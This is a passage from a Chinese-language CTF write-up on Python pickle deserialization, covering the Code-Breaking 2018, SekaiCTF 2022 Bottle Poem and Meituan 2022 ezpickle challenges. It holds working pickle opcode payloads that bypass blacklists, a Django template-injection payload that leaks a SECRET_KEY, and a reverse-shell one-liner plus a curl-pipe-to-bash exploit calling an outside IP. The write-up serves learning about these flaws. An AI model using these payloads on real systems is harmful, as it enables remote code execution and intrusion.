    I1
    o.'''
再或者
    opcode = b'''c__main__
    admin
    (((((c__main__
    admin
    i__builtin__
    dir
    i__builtin__
    reversed
    i__builtin__
    next
    I1
    db(S'admin'
    I1
    i__main__
    User
    .'''
#### Code-Breaking 2018 picklecode
起环境之后可以看到：
直接审计源码，使用的是 django 模板，很简单可以看出来是一个 pickle 反序列化，映入眼帘的 manger.py 中就可以看到写好的
`PickleSerializer`
添加了一系列的黑名单，可以在 setting 下的 `SESSION_SERIALIZER` 中找到调用
> 这里看过 P 牛的 WP 后补充一下，`SESSION_ENGINE` 指的是 Django 使用时将用户认证信息存储在哪里，在一般的 Django
> 项目中很少看到对这两个值进行设置，默认Django项目中，这两个值分别是：`django.contrib.sessions.backends.db`和`django.contrib.sessions.serializers.JSONSerializer`，显然默认
> Django 的 session 是使用 json 的形式，存储在数据库里。
>
> 简单理解的话就是
> 用户的session对象先由`SESSION_SERIALIZER`指定的方式转换成一个字符串，再由`SESSION_ENGINE`指定的方式存储到某个地方。
继续审计，我们可以在 `challenge\views.py` 中找到可控点，这里直接被拼接进了 模板渲染，显然会存在一个模板注入的漏洞
Django
的模板引擎沙箱其实一直是很安全的，也就是说即使你让用户控制了模板或模板的一部分，造成模板注入漏洞，也无法通过这个漏洞来执行代码。但是我们可以利用这里获取一些敏感信息。
常用的 Django 格式化字符串的 payload：
    {user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
    {user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}
思路是一样的，但是和格式化字符串漏洞不同，Django的模板引擎有一定限制，比如我们无法读取用下划线开头的属性，所以这里的两种 payload
都是不能用的。
这个 payload 我们可以通过调试得到，在 debug 里面一点点找
很累眼
    request.user.groups.source_field.opts.app_config.module.settings.SECRET_KEY
这样就得到了 secret_key
    zs%o-mvuihtk6g4pgd+xpa&1hh9%&ulnf!@9qx8_y5kk+7^cvm
这里是第一个沙箱的内容，第二个沙箱就是我们的 pickle 了，也就是 `SESSION_SERIALIZER =
'core.serializer.PickleSerializer'`
这里的黑名单限制的是 `module` 必须为 `builtins`，同时`name` 中不能有 `{'eval', 'exec', 'execfile',
'compile', 'open', 'input', '__import__', 'exit'}`
我们通过 `builtins.getattr('builtins', 'eval')` 取 eval 方法就可以绕过这里的检测了
    opcode = b'''cbuiltins
    getattr         # 使用c，获取 getattr 这个可执行对象
    (cbuiltins
    dict
    S'get'
    tR(cbuiltins
    globals
    (tRS'builtins'
    tRp1            # 用dict.get来从globals的结果中拿到上下文里的builtins对象，并将这个对象放置在memo[1]
    cbuiltins
    getattr
    (g1
    S'eval'         # 利用得到的 builtins 对象调用 getattr('builtins', 'eval')
    tR(S'__import__("os").system("calc")' 写入 eval 的参数
    tR.
    '''
#### SekaiCTF 2022 Bottle Poem
可以猜测这里存在一个任意文件读取，直接读 `../app.py` 是 No，不过可以读到 `/proc/self/cmdline`
然后读绝对路径就可以读源码了
    from bottle import route, run, template, request, response, error
    from config.secret import sekai
    import os
    import re
    @route("/")
    def home():
        return template("index")
    @route("/show")
    def index():
        response.content_type = "text/plain; charset=UTF-8"
        param = request.query.id
        if re.search("^../app", param):
            return "No!!!!"
        requested_path = os.path.join(os.getcwd() + "/poems", param)
        try:
            with open(requested_path) as f:
                tfile = f.read()
        except Exception as e:
            return "No This Poems"
        return tfile
    @error(404)
    def error404(error):
        return template("error")
    @route("/sign")
    def index():
        try:
            session = request.get_cookie("name", secret=sekai)
            if not session or session["name"] == "guest":
                session = {"name": "guest"}
                response.set_cookie("name", session, secret=sekai)
                return template("guest", name=session["name"])
            if session["name"] == "admin":
                return template("admin", name=session["name"])
        except:
            return "pls no hax"
    if __name__ == "__main__":
        os.chdir(os.path.dirname(__file__))
        run(host="0.0.0.0", port=8080)
稍微审计一下就可以发现，这里没有使用常用的 flask，用了一个叫 bottle 的东西，可能是我们的突破点，然后这里还有一个 config.secret
也就是 `/app/config/secret.py`，后续也有一个 session 用户的问题。
`secret` 知道了，这里显然需要用 bottle 伪造出来一个权限为 admin 的 session
但是并没有什么用 ...
这里实际上是一个 Pickle 反序列化，至于如何得知的我们就只能去审计源码了，跟进源码中调用的 bottle 的几种方法
这里看到 bottle request 的 get_cookie 方法
这里是它的 get_cookie 方法，这里可以看到一个 `cookie_decode` ，跟进
可以看到这里调用了 `pickle.loads`
再看一下 set_cookie 方法
可以看到，这里和上面对应的有一个 cookie_encode 方法
可以看到，这里调用了 `pickle.dumps(data, -1)` 这里没有过滤，我们可以直接传入最简单的 `__reduce__` 生成的
payload
    if secret:
                value = touni(cookie_encode((name, value), secret))
那么我们的 pickle 内容相应的也就存在了 `(name, value)` 也就额是 cookie_encode 的 data 参数
python3 反弹shell
    python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('47.104.14.160',2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
或者用 curl 自己服务器的方式反弹 shell
exp:
    import os
    from bottle import cookie_encode
    class Test:
        def __reduce__(self):
            return (eval, ('__import__("os").popen("curl http://47.104.14.160/shell.html|bash")',))
    exp = cookie_encode(
        ('session', {"name": [Test()]}),
        "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
    )
    print(exp)
#### 美团CTF 2022 ezpickle
    import base64
    import pickle
    from flask import Flask, session
    import os
    import random
    app = Flask(__name__)
    app.config['SECRET_KEY'] = os.urandom(2).hex() #设置key为随机打乱的4位数字字母组合例如a8c3
    @app.route('/')
    def hello_world():
        if not session.get('user'):
            session['user'] = ''.join(random.choices("admin", k=5))#设置user为a,d,m,i,n任意拼接的五个字符，例如aadai,admmi...
        return 'Hello {}!'.format(session['user'])
    @app.route('/admin')
    def admin():
        if session.get('user') != "admin":
            return f""
        else:
            try:
                a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")
                if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
                    raise pickle.UnpicklingError("R i o b is forbidden")
                pickle.loads(base64.b64decode(session.get('ser_data')))
                return "ok"
            except:
                return "error!"
    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=8888)
SECRET_KEY 很简单，爆破就好了，flask-unsign 可以利用字典爆破，我们可以写一个字典用工具爆破就可以了
过滤了操作码 R o i b，还有几个关键字，这里考虑使用 python 的内置函数来进行 bypass，这里用的是 map 函数 ，这里我们可以使用
bytes `bytes_new->PyBytes_FromObject->_PyBytes_FromIterator->PyIter_Next`
来触发迭代，具体的分析参照上面的 **利用 python 内置函数绕过**
    #bytes.__new__(bytes,map.__new__(map,os.system,('whoami',)))
    opcode=b'''c__builtin__
    map
    p0
    0(S'whoami'
    tp1
    0(cos
    system
    g1
    tp2
    0g0
    g2
    \x81p3
    0c__builtin__
    bytes
    p4
    (g3
    t\x81.'''
或者也可以使用 `tuple` 也就是 `tuple_new_impl->PySequence_Tuple->PyIter_Next`
    opcode=b'''c__builtin__
    map
    p0
    0(S'whoami'
    tp1
    0(cos
    system
    g1
    tp2
    0g0
    g2
    \x81p3
    0c__builtin__
    tuple
    p4
    (g3
    t\x81.'''
    pickle.loads(opcode)
或者我们也可以换一个内置函数，比如 filter
    opcode=b'''c__builtin__
    filter
    p0
    0(S'whoami'
    tp1
    0(cos
    system
    g1
    tp2
    0g0
    g2
    \x81p3
    0c__builtin__
    tuple
    p4
    (g3
    t\x81.'''
    pickle.loads(opcode)